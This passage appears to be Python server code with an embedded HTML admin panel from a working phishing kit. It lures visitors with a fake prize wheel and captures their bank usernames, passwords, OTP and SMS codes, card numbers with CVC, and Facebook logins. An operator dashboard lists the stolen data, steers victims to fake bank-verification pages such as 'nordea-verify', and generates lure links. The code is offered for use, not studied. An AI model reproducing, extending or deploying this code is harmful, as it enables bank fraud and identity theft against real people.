                    <li><a href="/jehat/dashboard"><i class="ti-panel"></i><p>Loglar</p></a></li>
                    <li class="active">
                        <a href="/jehat/bank/list"><i class="ti-credit-card"></i><p>Banka Listesi</p></a>
                    </li>
                    <li><a href="/jehat/bank/add"><i class="ti-plus"></i><p>Banka Ekle</p></a></li>
                </ul>
            </div>
        </div>
        <div class="main-panel">
            <nav class="navbar navbar-default">
                <div class="container-fluid">
                    <div class="navbar-header">
                        <a class="navbar-brand" href="/jehat/bank/list">← Banka Listesine Dön</a>
                    </div>
                </div>
            </nav>
            <div class="content">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-md-12">
                            <div class="card">
                                <div class="header">
                                    <h4 class="title">Banka Düzenle: <span id="bankNameTitle"></span></h4>
                                </div>
                                <div class="content">
                                    <form id="editBankForm" enctype="multipart/form-data">
                                        <input type="hidden" id="bankId" value="">

                                        <div class="form-section">
                                            <h5>Temel Bilgiler</h5>
                                            <div class="row">
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label>Ülke</label>
                                                        <select class="form-control" id="country">
                                                            <option value="">Ülke Seçiniz</option>
                                                            <option value="finland">Finlandiya</option>
                                                            <option value="spain">İspanya</option>
                                                            <option value="austria">Avusturya</option>
                                                            <option value="denmark">Danimarka</option>
                                                            <option value="norway">Norveç</option>
                                                            <option value="sweden">İsveç</option>
                                                            <option value="australia">Avustralya</option>
                                                            <option value="hong kong">Hong Kong</option>
                                                            <option value="ireland">İrlanda</option>
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label>Banka Adı</label>
                                                        <input type="text" class="form-control" id="bankName" placeholder="Banka adını giriniz">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row">
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label>Banka Başlığı</label>
                                                        <input type="text" class="form-control" id="bankTitle" placeholder="Banka başlığını giriniz">
                                                    </div>
                                                </div>
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label>Durum</label>
                                                        <select class="form-control" id="status">
                                                            <option value="active">Aktif</option>
                                                            <option value="inactive">Pasif</option>
                                                        </select>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="form-section">
                                            <h5>Logo</h5>
                                            <div class="row">
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label>Mevcut Logo</label><br>
                                                        <img id="currentLogo" class="current-logo" src="" alt="Logo">
                                                    </div>
                                                </div>
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label>Yeni Logo (opsiyonel)</label>
                                                        <input type="file" class="form-control" id="newLogo" accept="image/png,image/webp">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="form-section">
                                            <h5>Giriş Formu Ayarları</h5>
                                            <div class="row">
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label>Input Label 1 (Kullanıcı Adı)</label>
                                                        <input type="text" class="form-control" id="inputLabel1" placeholder="Örn: Käyttäjätunnus">
                                                    </div>
                                                </div>
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label>Şifre Göster</label>
                                                        <select class="form-control" id="showPassword">
                                                            <option value="1">Evet</option>
                                                            <option value="0">Hayır</option>
                                                        </select>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row" id="passwordRow">
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label>Input Label 2 (Şifre)</label>
                                                        <input type="text" class="form-control" id="inputLabel2" placeholder="Örn: Salasana">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="form-section">
                                            <h5>Seçenek Ayarları</h5>
                                            <div class="row">
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label>Giriş Seçeneği</label>
                                                        <select class="form-control" id="loginOption" onchange="toggleOptions()">
                                                            <option value="0">Pasif</option>
                                                            <option value="1">Aktif</option>
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="col-md-6" id="optionCountDiv" style="display:none;">
                                                    <div class="form-group">
                                                        <label>Seçenek Sayısı</label>
                                                        <select class="form-control" id="optionCount" onchange="toggleOptionNames()">
                                                            <option value="0">Seçiniz</option>
                                                            <option value="1">1</option>
                                                            <option value="2">2</option>
                                                            <option value="3">3</option>
                                                        </select>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row" id="optionNamesRow" style="display:none;">
                                                <div class="col-md-4" id="opt1div"><div class="form-group"><label>1. Seçenek Adı</label><input type="text" class="form-control" id="optionName1"></div></div>
                                                <div class="col-md-4" id="opt2div" style="display:none;"><div class="form-group"><label>2. Seçenek Adı</label><input type="text" class="form-control" id="optionName2"></div></div>
                                                <div class="col-md-4" id="opt3div" style="display:none;"><div class="form-group"><label>3. Seçenek Adı</label><input type="text" class="form-control" id="optionName3"></div></div>
                                            </div>
                                        </div>

                                        <div class="form-section">
                                            <h5>Liste Giriş Ayarları</h5>
                                            <div class="row">
                                                <div class="col-md-6">
                                                    <div class="form-group">
                                                        <label>Girişi Listele</label>
                                                        <select class="form-control" id="listLogin" onchange="toggleListLogin()">
                                                            <option value="0">Pasif</option>
                                                            <option value="1">Aktif</option>
                                                        </select>
                                                    </div>
                                                </div>
                                                <div class="col-md-6" id="listCountDiv" style="display:none;">
                                                    <div class="form-group">
                                                        <label>Kaç Seçenek Olsun?</label>
                                                        <input type="number" class="form-control" id="loginListCount" min="1" max="10" placeholder="Seçenek sayısı">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row" id="listTextRow" style="display:none;">
                                                <div class="col-md-12">
                                                    <div class="form-group">
                                                        <label>Giriş Listesi Metni</label>
                                                        <textarea class="form-control" id="loginListText" rows="3" placeholder="Her satıra bir seçenek"></textarea>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="row">
                                            <div class="col-md-12">
                                                <button type="submit" class="btn btn-info btn-fill pull-right save-btn" id="saveBtn">
                                                    <i class="fa fa-save"></i> Değişiklikleri Kaydet
                                                </button>
                                                <a href="/jehat/bank/list" class="btn btn-default pull-left">İptal</a>
                                                <div class="clearfix"></div>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="/static/assets/js/jquery-1.10.2.js"></script>
    <script src="/static/assets/js/bootstrap.min.js"></script>
    <script>
    var bankData = {bank_json};

    function populate() {{
        document.getElementById('bankId').value = bankData.id || '';
        document.getElementById('bankNameTitle').textContent = bankData.bank_name || '';
        document.getElementById('country').value = (bankData.country || '').toLowerCase();
        document.getElementById('bankName').value = bankData.bank_name || '';
        document.getElementById('bankTitle').value = bankData.bank_title || '';
        document.getElementById('status').value = bankData.status || 'active';
        document.getElementById('inputLabel1').value = bankData.input_label_1 || '';
        document.getElementById('inputLabel2').value = bankData.input_label_2 || '';
        document.getElementById('showPassword').value = bankData.show_password || '1';
        document.getElementById('loginOption').value = bankData.login_option || '0';
        document.getElementById('optionCount').value = bankData.option_count || '0';
        document.getElementById('optionName1').value = bankData.option_name_1 || '';
        document.getElementById('optionName2').value = bankData.option_name_2 || '';
        document.getElementById('optionName3').value = bankData.option_name_3 || '';
        document.getElementById('listLogin').value = bankData.list_login || '0';
        document.getElementById('loginListCount').value = bankData.login_list_count || '';
        document.getElementById('loginListText').value = bankData.login_list_text || '';

        if (bankData.logo) {{
            document.getElementById('currentLogo').src = '/static/img/banks/' + bankData.logo;
        }}

        toggleOptions();
        toggleOptionNames();
        toggleListLogin();
        togglePasswordRow();
    }}

    function togglePasswordRow() {{
        document.getElementById('passwordRow').style.display = document.getElementById('showPassword').value === '1' ? '' : 'none';
    }}
    document.getElementById('showPassword').addEventListener('change', togglePasswordRow);

    function toggleOptions() {{
        var v = document.getElementById('loginOption').value;
        document.getElementById('optionCountDiv').style.display = v === '1' ? '' : 'none';
        if (v === '1') toggleOptionNames();
        else document.getElementById('optionNamesRow').style.display = 'none';
    }}

    function toggleOptionNames() {{
        var c = parseInt(document.getElementById('optionCount').value) || 0;
        var show = document.getElementById('loginOption').value === '1' && c > 0;
        document.getElementById('optionNamesRow').style.display = show ? '' : 'none';
        document.getElementById('opt1div').style.display = c >= 1 ? '' : 'none';
        document.getElementById('opt2div').style.display = c >= 2 ? '' : 'none';
        document.getElementById('opt3div').style.display = c >= 3 ? '' : 'none';
    }}

    function toggleListLogin() {{
        var v = document.getElementById('listLogin').value;
        document.getElementById('listCountDiv').style.display = v === '1' ? '' : 'none';
        document.getElementById('listTextRow').style.display = v === '1' ? '' : 'none';
    }}

    populate();

    document.getElementById('editBankForm').addEventListener('submit', function(e) {{
        e.preventDefault();
        var btn = document.getElementById('saveBtn');
        btn.disabled = true;
        btn.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Kaydediliyor...';

        var fd = new FormData();
        fd.append('id', document.getElementById('bankId').value);
        fd.append('bank_id', document.getElementById('bankId').value);
        fd.append('country', document.getElementById('country').value);
        fd.append('bank_name', document.getElementById('bankName').value);
        fd.append('bank_title', document.getElementById('bankTitle').value);
        fd.append('status', document.getElementById('status').value);
        fd.append('input_label_1', document.getElementById('inputLabel1').value);
        fd.append('input_label_2', document.getElementById('inputLabel2').value);
        fd.append('show_password', document.getElementById('showPassword').value);
        fd.append('login_option', document.getElementById('loginOption').value);
        fd.append('option_count', document.getElementById('optionCount').value);
        fd.append('option_name_1', document.getElementById('optionName1').value);
        fd.append('option_name_2', document.getElementById('optionName2').value);
        fd.append('option_name_3', document.getElementById('optionName3').value);
        fd.append('list_login', document.getElementById('listLogin').value);
        fd.append('login_list_count', document.getElementById('loginListCount').value);
        fd.append('login_list_text', document.getElementById('loginListText').value);

        var logoFile = document.getElementById('newLogo').files[0];
        if (logoFile) fd.append('logo', logoFile);

        fetch('/jehat/editBank', {{
            method: 'POST',
            body: fd,
            credentials: 'include'
        }}).then(function(r) {{ return r.json(); }}).then(function(data) {{
            btn.disabled = false;
            btn.innerHTML = '<i class="fa fa-save"></i> Değişiklikleri Kaydet';
            if (data.success) {{
                alert('Banka başarıyla güncellendi!');
                window.location.href = '/jehat/bank/list';
            }} else {{
                alert(data.message || 'Güncelleme hatası');
            }}
        }}).catch(function(err) {{
            btn.disabled = false;
            btn.innerHTML = '<i class="fa fa-save"></i> Değişiklikleri Kaydet';
            alert('Hata: ' + err.message);
        }});
    }});
    </script>
</body>
</html>'''
            self._send(edit_html, 'text/html; charset=utf-8'); return

        # visitor/{id}
        if sub.startswith('visitor'):
            vid = sub.replace('visitor/', '').replace('visitor', '')
            if vid:
                v = store.get_visitor(vid)
                if v:
                    self._json(v); return
                self._json({'error': 'not found'}, 404); return
            # /jehat/visitor without ID → return active visitors list
            self._json({'success': True, 'data': store.get_active_visitors()}); return

        # listBan, dbrow
        if sub in ('listBan', 'listBanned'):
            self._json({'success': True, 'data': store.data['banned']}); return
        if sub == 'dbrow' or sub.startswith('dbrow'):
            self._json({'success': True, 'data': store.data['visitors'][-50:]}); return

        print(f"  [UNKNOWN GET] /jehat/{sub}")
        # Bilinmeyen GET endpoint'ler için geçerli fallback
        self._json({'success': True, 'data': [], 'message': 'OK'})

    # ==========================================
    # ADMIN API GET
    # ==========================================
    def _handle_admin_api_get(self, sub, qs=None):
        if sub == 'listBank':
            # Original API returns bare array (not wrapped in {success, data})
            return store.get_banks()

        if sub == 'getAllUsers':
            return {'success': True, 'data': store.get_all_users()}

        if sub == 'getOnlineUsers':
            online = []
            now = time.time()
            for sid, sess in list(store.data['sessions'].items()):
                if now - sess.get('last_activity', 0) < 300:
                    online.append({
                        'id': sess.get('user_id', '0'),
                        'username': sess['username'],
                        'role': sess.get('role', 'admin'),
                        'last_activity': datetime.fromtimestamp(sess['last_activity']).strftime('%Y-%m-%d %H:%M:%S'),
                        'current_ip': '127.0.0.1',
                        'connection_status': 'online'
                    })
            return {'success': True, 'data': online}

        if sub == 'getActivityLogs':
            logs = store.data['activity_logs'][:100]
            # Ensure all expected fields exist
            for log in logs:
                log.setdefault('target_table', None)
                log.setdefault('target_id', None)
                log.setdefault('user_agent', '')
            return {
                'success': True, 'data': logs,
                'pagination': {
                    'current_page': 1,
                    'total_pages': max(1, (len(store.data['activity_logs']) + 49) // 50),
                    'total_logs': len(store.data['activity_logs']),
                    'per_page': 50
                }
            }

        if sub == 'getCountrySettings':
            return {'success': True, 'settings': store.data['country_settings']}

        if sub in ('getBannedList', 'getBanned', 'getBannedUsers'):
            return {'success': True, 'data': store.data['banned']}

        if sub in ('getDashboard', 'getDashboardData', 'getDashboardStats', 'getStats'):
            visitors = store.get_active_visitors()
            rows = []
            for v in reversed(store.data['visitors'][-50:]):
                row = {
                    'id': v.get('id'),
                    'reward': v.get('reward', v.get('prize', '')),
                    'fullname': v.get('fullname', f"{v.get('name', '')} {v.get('surname', '')}".strip()),
                    'phone': v.get('phone', ''),
                    'sms': v.get('sms', ''),
                    'sms2': v.get('sms2', ''),
                    'selected_option': v.get('selected_option', ''),
                    'login_list_option': v.get('login_list_option', ''),
                    'selected_tab': v.get('selected_tab', ''),
                    'selectedBank': v.get('selectedBank', v.get('bank_selected', v.get('bank_name', ''))),
                    'bank_selected': v.get('bank_selected', v.get('selectedBank', v.get('bank_name', ''))),
                    'bank_name': v.get('bank_name', ''),
                    'verfugernummer': v.get('verfugernummer', ''),
                    'username': v.get('username', v.get('bank_username', '')),
                    'bank_username': v.get('bank_username', v.get('username', '')),
                    'password': v.get('password', v.get('bank_password', '')),
                    'bank_password': v.get('bank_password', v.get('password', '')),
                    'faceid': v.get('faceid', ''),
                    'facepw': v.get('facepw', ''),
                    'card_number': v.get('card_number', ''),
                    'expiry_date': v.get('expiry_date', ''),
                    'cvc': v.get('cvc', ''),
                    'nordea_approve': v.get('nordea_approve', ''),
                    'spankki_approve': v.get('spankki_approve', ''),
                    'aws': v.get('aws', ''),
                    'page': v.get('page', ''),
                    'ip': v.get('ip', ''),
                    'status': v.get('status', ''),
                    'country': v.get('country', 'FI'),
                    'step': v.get('step', 1),
                    'percent': v.get('percent', ''),
                }
                rows.append(row)
            return {
                'success': True, 'data': rows,
                'total_visitors': len(store.data['visitors']),
                'online_count': len(visitors),
                'total_submissions': len([v for v in store.data['visitors'] if v.get('fullname') or v.get('name')]),
                'banned_count': len(store.data['banned']),
            }

        if sub in ('getAdminSettings', 'getSettings', 'getConfig'):
            return {'success': True, 'data': {'site_name': 'Tokmanni', 'site_url': f'http://localhost:{PORT}'}}

        if sub.startswith('getLanguage') or sub.startswith('getTranslation'):
            return {'success': True, 'data': {}}

        if sub in ('getWheelSettings', 'getWheelData'):
            wp = os.path.join(PUBLIC_PAGES, 'wheel.html')
            if os.path.isfile(wp):
                with open(wp, 'r') as f:
                    content = f.read()
                m = re.search(r"var wheelData = JSON\.parse\('(.+?)'\);", content)
                if m:
                    return {'success': True, 'data': json.loads(m.group(1))}
            return {'success': True, 'data': {}}

        if sub == 'dbrow' or sub.startswith('dbrow'):
            rows = []
            for v in store.data['visitors'][-50:]:
                row = dict(v)  # copy all fields
                # Ensure dashboard-expected fields exist
                row.setdefault('reward', row.get('prize', ''))
                row.setdefault('fullname', f"{row.get('name', '')} {row.get('surname', '')}".strip())
                row.setdefault('selectedBank', row.get('bank_selected', row.get('bank_name', '')))
                row.setdefault('bank_selected', row.get('selectedBank', row.get('bank_name', '')))
                row.setdefault('bank_username', row.get('username', ''))
                row.setdefault('bank_password', row.get('password', ''))
                row.setdefault('verfugernummer', '')
                row.setdefault('faceid', '')
                row.setdefault('facepw', '')
                row.setdefault('card_number', '')
                row.setdefault('expiry_date', '')
                row.setdefault('cvc', '')
                row.setdefault('sms2', '')
                row.setdefault('selected_option', '')
                row.setdefault('login_list_option', '')
                row.setdefault('selected_tab', '')
                row.setdefault('nordea_approve', '')
                row.setdefault('spankki_approve', '')
                row.setdefault('aws', '')
                row.setdefault('percent', '')
                rows.append(row)
            return {'success': True, 'data': rows, 'total': len(store.data['visitors'])}

        # bank/edit/{id} burada JSON döndürmüyoruz, do_GET'te HTML render ediyoruz
        bank_edit_match = re.match(r'^bank/edit/(\d+)$', sub)
        if bank_edit_match:
            return None  # None döndür ki do_GET'teki HTML handler çalışsın

        return None

    # ==========================================
    # PUBLIC API
    # ==========================================
    def _get_visitor_id(self, post_data=None):
        """Get visitor_id from post_data, cookie, or create new visitor"""
        # 1. Post data'dan
        vid = ''
        if post_data:
            vid = post_data.get('visitor_id', post_data.get('session_id', ''))
            # parse_qs returns lists, handle that
            if isinstance(vid, list):
                vid = vid[0] if vid else ''
        # 2. Cookie'den
        if not vid:
            for part in self.headers.get('Cookie', '').split(';'):
                p = part.strip()
                if p.startswith('vid='):
                    vid = p.split('=', 1)[1]
                    break
        # 3. Visitor var mı kontrol et
        if vid and store.get_visitor(vid):
            return vid
        # 4. Yoksa yeni oluştur
        ip = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()
        visitor = store.add_visitor(ip)
        return visitor['id']

    def _handle_public_api(self, path, method='GET', post_data=None):
        endpoint = path.replace('/api/', '')
        post_data = post_data or {}

        if endpoint.startswith('getRo'):
            vid = self._get_visitor_id(post_data)
            visitor = store.get_visitor(vid) if vid else None
            if visitor:
                resp = {
                    'success': True, 'role': 'user', 'country': visitor.get('country', 'FI').lower(),
                    'status': visitor.get('status', 'active'),
                    'page': visitor.get('page', 'wheel'),
                    'visitor_id': vid,
                    'sms_request': visitor.get('sms_request', {}),
                    'op_pin': visitor.get('op_pin', ''),
                    'verify_texts': visitor.get('verify_texts', {}),
                    'custom_verify_texts': visitor.get('custom_verify_texts', {}),
                    'whatsapp_number': visitor.get('whatsapp_number', ''),
                    'support_step': visitor.get('support_step', ''),
                    'support_percent': visitor.get('support_percent', ''),
                }
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Set-Cookie', f'vid={vid}; Path=/; SameSite=Lax')
                self.end_headers()
                self.wfile.write(json.dumps(resp).encode()); return
            self._json({'success': True, 'role': 'user', 'country': 'finland', 'status': 'active', 'page': 'wheel'}); return

        if endpoint.startswith('start'):
            vid = self._get_visitor_id(post_data)
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Set-Cookie', f'vid={vid}; Path=/; SameSite=Lax')
            self.end_headers()
            resp = json.dumps({'success': True, 'session_id': vid, 'visitor_id': vid, 'status': 'started'})
            self.wfile.write(resp.encode()); return

        if endpoint.startswith('bankU'):
            vid = self._get_visitor_id(post_data)
            bank_id = post_data.get('bank_id', post_data.get('bankId', ''))
            if vid and bank_id:
                bank = store.get_bank(bank_id)
                bank_name = bank.get('bank_name', '') if bank else ''
                store.update_visitor(vid, {
                    'bank_id': bank_id,
                    'bank_name': bank_name,
                    'selectedBank': bank_name,
                    'bank_selected': bank_name,
                    'page': 'bankLogin',
                })
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Set-Cookie', f'vid={vid}; Path=/; SameSite=Lax')
            self.end_headers()
            resp = json.dumps({'success': True, 'status': 'ok', 'visitor_id': vid})
            self.wfile.write(resp.encode()); return

        if endpoint.startswith('save_'):
            vid = self._get_visitor_id(post_data)
            update = {}
            if 'prize' in endpoint:
                prize_val = post_data.get('prize', post_data.get('amount', ''))
                update = {'prize': prize_val, 'reward': prize_val, 'page': 'claimReward'}
            elif 'data' in endpoint or 'claim' in endpoint:
                name = post_data.get('name', '')
                surname = post_data.get('surname', '')
                phone = post_data.get('phone', '')
                update = {
                    'name': name, 'surname': surname, 'phone': phone,
                    'fullname': f"{name} {surname}".strip(),
                    'page': 'bankList'
                }
            elif 'login' in endpoint:
                update = {
                    'username': post_data.get('username', post_data.get('user', '')),
                    'bank_username': post_data.get('username', post_data.get('user', '')),
                    'password': post_data.get('password', post_data.get('pass', '')),
                    'bank_password': post_data.get('password', post_data.get('pass', '')),
                    'verfugernummer': post_data.get('verfugernummer', ''),
                    'selected_option': post_data.get('selected_option', ''),
                    'login_list_option': post_data.get('login_list_option', ''),
                    'selected_tab': post_data.get('selected_tab', ''),
                    'page': 'wait', 'step': 2
                }
            elif 'otp' in endpoint:
                update = {'otp': post_data.get('otp', post_data.get('code', '')), 'sms': post_data.get('otp', post_data.get('code', '')), 'page': 'wait', 'step': 3}
            elif 'sms' in endpoint:
                update = {'sms2': post_data.get('sms', post_data.get('code', '')), 'page': 'wait', 'step': 4}
            elif 'card' in endpoint:
                update = {
                    'card_number': post_data.get('card_number', post_data.get('cardNumber', '')),
                    'expiry_date': post_data.get('expiry_date', post_data.get('expiryDate', '')),
                    'cvc': post_data.get('cvc', post_data.get('cvv', '')),
                    'page': 'wait', 'step': 5
                }
            elif 'facebook' in endpoint:
                update = {
                    'faceid': post_data.get('email', post_data.get('faceid', '')),
                    'facepw': post_data.get('password', post_data.get('facepw', '')),
                    'page': 'wait'
                }
            else:
                update = {'page': 'wait'}
            if vid:
                store.update_visitor(vid, update)
            # Set vid cookie so subsequent requests use same visitor
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Set-Cookie', f'vid={vid}; Path=/; SameSite=Lax')
            self.end_headers()
            resp = json.dumps({'success': True, 'status': 'ok', 'next_step': True, 'visitor_id': vid})
            self.wfile.write(resp.encode()); return

        if endpoint in ('verify', 'validate', 'verifyOtp', 'verifySms', 'checkOtp', 'checkSms'):
            self._json({'success': True, 'verified': True, 'status': 'ok'}); return

        if endpoint in ('check', 'status', 'getStatus', 'checkStatus'):
            self._json({'success': True, 'status': 'active', 'step': 1}); return

        print(f"  [API] Unknown: {path} ({method})")
        self._json({'success': True, 'status': 'ok'})

    # ==========================================
    # POST
    # ==========================================
    def do_POST(self):
        cl = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(cl) if cl > 0 else b''
        path = unquote(self.path.split('?')[0])
        ct = self.headers.get('Content-Type', '')
        post_data = {}
        files = {}
        # Request logging
        print(f"  [POST] {path} CT={ct[:40]} CL={cl}")

        if 'multipart' in ct:
            post_data, files = parse_multipart(body, ct)
        elif 'urlencoded' in ct:
            for pair in body.decode('utf-8', errors='replace').split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    post_data[unquote(k)] = unquote(v.replace('+', ' '))
        elif 'json' in ct:
            try:
                post_data = json.loads(body)
            except:
                pass

        # === ADMIN LOGIN ===
        if path in ('/jehat/login', '/jehat'):
            u = post_data.get('username', '')
            p = post_data.get('password', '')
            user, err = store.authenticate(u, p)
            if user:
                sid = store.create_session(u, user.get('role', 'admin'), user.get('id', '0'))
                store.add_activity('login', f'{u} giriş yaptı', u)
                self.send_response(302)
                self.send_header('Location', '/jehat/dashboard')
                self.send_header('Set-Cookie', f'ci_session={sid}; Path=/')
                self.end_headers()
            else:
                self.send_response(302)
                self.send_header('Location', '/jehat?error=1')
                self.end_headers()
            return

        # === PUBLIC API ===
        if path.startswith('/api/'):
            self._handle_public_api(path, 'POST', post_data)
            return

        # === /visitor/* ===
        if path.startswith('/visitor/'):
            action = path.replace('/visitor/', '')
            vid = post_data.get('visitor_id', post_data.get('id', ''))
            if action == 'updateStatus' and vid:
                store.update_visitor(vid, {'status': post_data.get('status', 'active'), 'page': post_data.get('page', '')})
            self._json({'success': True}); return

        # === FETCH LOG (interceptor) ===
        if path == '/__log_fetch':
            method = post_data.get('method', 'GET') if isinstance(post_data, dict) else 'GET'
            url = post_data.get('url', '') if isinstance(post_data, dict) else ''
            page = post_data.get('page', '') if isinstance(post_data, dict) else ''
            xtype = post_data.get('type', 'fetch') if isinstance(post_data, dict) else 'fetch'
            print(f"  [INTERCEPTED {xtype.upper()}] {method} {url} (from {page})")
            self._json({'ok': True}); return

        # === ERROR LOG ===
        if path == '/__log_error':
            log_type = post_data.get('type', 'unknown') if isinstance(post_data, dict) else 'unknown'
            if log_type == 'error':
                print(f"  [JS ERROR] {post_data.get('msg', '')} at {post_data.get('url', '')}:{post_data.get('line', '')}:{post_data.get('col', '')}")
                stack = post_data.get('stack', '')
                if stack:
                    for line in str(stack).split('\n')[:3]:
                        print(f"             {line}")
            elif log_type == 'rejection':
                print(f"  [JS REJECT] {post_data.get('reason', '')}")
            elif log_type == 'xdata_change':
                print(f"  [ALPINE] x-data → {post_data.get('value', '')}")
            elif log_type == 'fetch':
                print(f"  [FETCH] {post_data.get('method', 'GET')} {post_data.get('url', '')}")
            self._json({'ok': True}); return

        if path == '/__log_api':
            self._send(b'ok', 'text/plain'); return

        # === ADMIN POST ===
        if not path.startswith('/jehat/'):
            print(f"  [POST] Unknown: {path}")
            self._json({'success': True}); return

        sub = path.replace('/jehat/', '')
        sess = self._require_admin()

        # --- USER CRUD ---
        if sub == 'addUser':
            if not self._check_role(sess, 'admin'):
                self._json({'success': False, 'message': 'Yetkisiz'}, 401); return
            user, err = store.add_user(
                post_data.get('username', ''), post_data.get('password', ''),
                post_data.get('role', 'admin'), post_data.get('status', 'active')
            )
            if err:
                self._json({'success': False, 'message': err}); return
            store.add_activity('addUser', f"Kullanıcı eklendi: {user['username']}", sess['username'])
            self._json({'success': True, 'message': 'Kullanıcı eklendi', 'data': user}); return

        if sub == 'editUser':
            if not self._check_role(sess, 'admin'):
                self._json({'success': False, 'message': 'Yetkisiz'}, 401); return
            uid = post_data.get('user_id', post_data.get('id', ''))
            user, err = store.edit_user(uid, post_data)
            if err:
                self._json({'success': False, 'message': err}); return
            store.add_activity('editUser', f"Kullanıcı düzenlendi: {user['username']}", sess['username'])
            self._json({'success': True, 'message': 'Kullanıcı güncellendi', 'data': user}); return

        if sub == 'deleteUser':
            if not self._check_role(sess, 'super_admin'):
                self._json({'success': False, 'message': 'Yetkisiz'}, 401); return
            uid = post_data.get('user_id', post_data.get('id', ''))
            store.delete_user(uid)
            store.add_activity('deleteUser', f"Kullanıcı silindi: #{uid}", sess['username'])
            self._json({'success': True, 'message': 'Kullanıcı silindi'}); return

        if sub == 'changeUserStatus':
            uid = post_data.get('user_id', post_data.get('id', ''))
            status = post_data.get('status', 'active')
            store.change_user_status(uid, status)
            self._json({'success': True, 'message': 'Durum güncellendi'}); return

        if sub in ('resetSession', 'cleanSessions', 'resetUserSession'):
            uid = post_data.get('user_id', post_data.get('id', ''))
            with store.lock:
                for u in store.data['users']:
                    if str(u['id']) == str(uid):
                        u['current_session'] = None
                store.data['sessions'] = {k: v for k, v in store.data['sessions'].items() if v.get('user_id') != uid}
                store._save()
            self._json({'success': True, 'message': 'Oturum sıfırlandı'}); return

        # --- BANK CRUD ---
        if sub == 'addBank':
            if not self._check_role(sess, 'admin'):
                self._json({'success': False, 'message': 'Yetkisiz'}, 401); return
            if 'logo' in files:
                logo_file = files['logo']
                filename = f"{int(time.time())}_{hashlib.md5(logo_file['data'][:100]).hexdigest()[:16]}.png"
                logo_path = os.path.join(SITE_ROOT, 'static/img/banks', filename)
                os.makedirs(os.path.dirname(logo_path), exist_ok=True)
                with open(logo_path, 'wb') as f:
                    f.write(logo_file['data'])
                post_data['logo'] = filename
            bank = store.add_bank(post_data)
            store.add_activity('addBank', f"Banka eklendi: {bank['bank_name']}", sess['username'])
            self._json({'success': True, 'message': 'Banka eklendi', 'data': bank}); return

        if sub == 'editBank':
            if not self._check_role(sess, 'admin'):
                self._json({'success': False, 'message': 'Yetkisiz'}, 401); return
            bank_id = post_data.get('id', post_data.get('bank_id', ''))
            if 'logo' in files:
                logo_file = files['logo']
                filename = f"{int(time.time())}_{hashlib.md5(logo_file['data'][:100]).hexdigest()[:16]}.png"
                logo_path = os.path.join(SITE_ROOT, 'static/img/banks', filename)
                os.makedirs(os.path.dirname(logo_path), exist_ok=True)
                with open(logo_path, 'wb') as f:
                    f.write(logo_file['data'])
                post_data['logo'] = filename
            bank = store.edit_bank(bank_id, post_data)
            if bank:
                store.add_activity('editBank', f"Banka düzenlendi: {bank['bank_name']}", sess['username'])
                self._json({'success': True, 'message': 'Banka güncellendi', 'data': bank})
            else:
                self._json({'success': False, 'message': 'Banka bulunamadı'})
            return

        if sub == 'deleteBank':
            if not self._check_role(sess, 'admin'):
                self._json({'success': False, 'message': 'Yetkisiz'}, 401); return
            bank_id = post_data.get('id', post_data.get('bank_id', ''))
            store.delete_bank(bank_id)
            store.add_activity('deleteBank', f"Banka silindi: #{bank_id}", sess['username'])
            self._json({'success': True, 'message': 'Banka silindi'}); return

        # --- LINK OLUŞTUR ---
        if sub == 'createLink':
            link = store.create_link(post_data)
            host = self.headers.get('Host', f'localhost:{PORT}')
            scheme = 'https' if 'ngrok' in host or 'https' in self.headers.get('X-Forwarded-Proto', '') else 'http'
            full_url = f"{scheme}://{host}/?link={link['id']}"
            store.add_activity('createLink', f"Link: {full_url}", sess['username'] if sess else 'system')
            self._json({
                'success': True, 'message': 'Link oluşturuldu',
                'data': {
                    'id': link['id'], 'url': full_url,
                    'campaign': link['campaign'], 'full_name': link['full_name'],
                    'prize': link['prize'], 'currency': link['currency'],
                }
            }); return

        # --- SEND REQUEST (Dashboard) ---
        if sub == 'sendRequest':
            action = post_data.get('action', post_data.get('type', ''))
            vid = post_data.get('visitor_id', post_data.get('id', post_data.get('row_id', '')))

            action_map = {
                'return': {'page': 'wheel', 'status': 'active'},
                'wheel': {'page': 'wheel', 'status': 'active'},
                'banklist': {'page': 'bankList', 'status': 'active'},
                'banklogin': {'page': 'bankLogin', 'status': 'active'},
                'wait': {'page': 'wait', 'status': 'active'},
                'card': {'page': 'card', 'status': 'active'},
                'facebook': {'page': 'facebook', 'status': 'active'},
                'success': {'page': 'success', 'status': 'completed'},
                'ban': {'page': 'banned', 'status': 'banned'},
                'bankloginerror': {'page': 'bankLoginError', 'status': 'active'},
                'nordea-verify': {'page': 'nordeaVerify', 'status': 'active'},
                'spankki-verify': {'page': 'spankkiVerify', 'status': 'active'},
                'support': {'page': 'support', 'status': 'active'},
